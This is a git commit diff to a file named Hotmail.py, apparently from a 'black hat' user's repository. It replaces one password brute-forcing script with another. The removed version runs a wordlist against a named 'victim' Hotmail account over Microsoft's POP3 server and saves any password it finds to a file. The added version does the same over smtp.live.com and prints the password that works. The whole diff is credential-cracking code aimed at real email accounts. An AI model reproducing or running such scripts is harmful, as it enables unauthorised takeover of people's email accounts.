762456e300ee978a7d4173b594122cfd5bbde8a5
Dark <54282163+Dark-Balck-Hat@users.noreply.github.com>
2019-08-27 19:03:54 +0200

    Update Hotmail.py

--- Hotmail.py
+++ Hotmail.py
@@ -1,32 +1,22 @@
-def hotmail():
-	user = raw_input("[+] Victim Hotmail: ")
-	passlist= raw_input("[+] Password List [pass.txt]: ")
-	fn = open (passlist, "r")
-	counting = fn.readlines()
-	print "[+] Worldlist Length: %s " % len(counting)
-	host = 'pop3.live.com'
-	port = 995
-	server = poplib.POP3_SSL(host, port)
-	print "Start cracking using hotmail server.....\n\r"
-	time.sleep(2)
-	fn = open (passlist, 'r')
-	for pass_file in fn:
-		print "[+] Trying: {0}".format(pass_file)+"\n\r"
-		pwd = pass_file[:-1]
-		try:
-			x = server.user(user)
-			yy = server.pass_(pwd)
-			if(yy == '+OK' or 'POP disabled'):
-				print "> Correct Password have been found....!\n\r"
-				time.sleep(2)
-				print "Email: {0}".format(user)+"\n\r"
-				print "Password is: {0}".format(pwd)+"\n\r\n\r\n\r"
-				server.quit()
-				fn.close()
-				fw = open('Hotmail.txt','w')
-				fw.write(user+': '+pwd)
-				fw.close()
-				print "Email and Password saved in Hotmail.txt file.\n\r"
-				exit()
-		except poplib.error_proto:
-			continue
+Stop = False 
+
+import smtplib 
+
+smtpserver = smtplib.SMTP("smtp.live.com",465)
+smtpserver.ehlo()
+smtpserver.starttls()
+print "[S O U F I A N E]"
+user = raw_input("Enter Email >")
+passwfile = raw_input("Enter Passwordfile >")
+passwfile = open(passwfile, "r")
+
+for password in passwfile:
+         try:
+                smtpserver.login(user, password)
+                
+                print "password : %s" % password
+                break;
+
+         except smtplib.SMTPAuthenticationError:
+                 print "[!]Faild: %s" %password 
+Stop = True 
